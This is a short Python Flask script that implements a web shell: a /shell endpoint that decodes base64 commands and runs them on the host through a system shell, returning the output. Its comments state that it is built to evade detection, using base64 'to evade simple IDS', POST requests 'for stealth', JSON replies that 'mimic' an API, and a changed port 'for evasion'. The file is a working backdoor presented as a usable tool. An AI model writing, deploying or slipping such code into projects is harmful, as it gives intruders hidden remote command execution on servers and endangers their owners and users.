from flask import Flask, request, jsonify
import subprocess
import base64  # For basic obfuscation
import os

app = Flask(__name__)

# Obfuscate commands with base64 to evade simple IDS
def execute_cmd(cmd):
    try:
        decoded_cmd = base64.b64decode(cmd).decode('utf-8')  # Decode incoming base64 cmd
        result = subprocess.check_output(decoded_cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except Exception as e:
        return str(e)

@app.route('/shell', methods=['GET', 'POST'])
def shell():
    if request.method == 'POST':
        cmd = request.form.get('cmd')  # Accept POST for stealth (less logged)
        if cmd:
            output = execute_cmd(cmd)
            return jsonify({'output': output})  # JSON response to mimic API
    else:
        return "<html><body><form method='post'><input name='cmd' placeholder='Base64 encoded cmd'><input type='submit'></form></body></html>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)  # Run on all interfaces, change port for evasion
